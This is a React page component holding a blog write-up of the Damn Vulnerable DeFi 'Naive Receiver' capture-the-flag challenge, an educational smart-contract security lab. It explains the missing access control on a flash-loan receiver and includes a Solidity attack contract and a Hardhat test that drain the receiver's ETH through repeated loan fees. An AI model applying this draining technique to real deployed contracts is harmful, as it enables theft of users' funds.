import Posts from "../Components/Posts";
import CodeSnippet from "../Components/CodeSnippet";

export default function Dvd1() {
  const p = Posts.posts.find(
    (o) => o.id === "damn-vulnerable-defi-solutions-2-naive-receiver"
  );
  return (
    <div>
      <h1 className="mb-6 md:text-5xl/[1.2]">{p.title}</h1>
      <p className="text-fade text-sm">
        {p.date} <span className="inline-block mx-4">|</span> Written by Fatih
        Isik
      </p>
      <p>
        There’s a pool with 1000 ETH in balance, offering flash loans. It has a
        fixed fee of 1 ETH.
      </p>
      <p>
        A user has deployed a contract with 10 ETH in balance. It’s capable of
        interacting with the pool and receiving flash loans of ETH.
      </p>
      <p>
        Take all ETH out of the user’s contract. If possible, in a single
        transaction.
      </p>
      <h2 className="mb-6">Solution</h2>
      <p>
        Flash loan receiver contract does not have any access control over
        <span className="code-h">onFlashLoan()</span> function, thus anyone can
        get flash loan behalf of the contract.
      </p>
      <p>
        To solve this challenge we will deploy another contract that takes flash
        loan 10 times behalf of the flash loan receiver contract. After the loop
        we will be paid 10 ETH in fees and the balance of the receiver will be
        0.
      </p>
      <CodeSnippet
        codeText={`  // SPDX-License-Identifier: MIT
    pragma solidity ^0.8.0;
        
    import "@openzeppelin/contracts/interfaces/IERC3156FlashBorrower.sol";
    import "./NaiveReceiverLenderPool.sol";
        
    contract Attack {
        address public constant ETH = 0xEeeeeEeeeEeEeeEeEeEeeEEEeeeeEeeeeeeeEEeE;
        
        function init(address payable _pool, address _receiver) public {
            IERC3156FlashBorrower receiver = IERC3156FlashBorrower(_receiver);
            NaiveReceiverLenderPool pool = NaiveReceiverLenderPool(_pool);
            for (uint256 i = 0; i < 10; i++) {
                pool.flashLoan(receiver, ETH, 1 ether, "x0");
            }
        }
    }`}
      />
      <p>
        In the test file we deploy the attack contract first then call the{" "}
        <span className="code-h">init()</span> function which will take flash
        loans behalf of the flash loan receiver contract and drain the ETH in
        it.
      </p>
      <CodeSnippet
        codeText={`  it("Execution", async function () {
    /** CODE YOUR SOLUTION HERE */
    const attackContract = await (
      await ethers.getContractFactory("Attack", deployer)
    ).deploy();

    attackContract.init(pool.address, receiver.address);
  });`}
      />
    </div>
  );
}
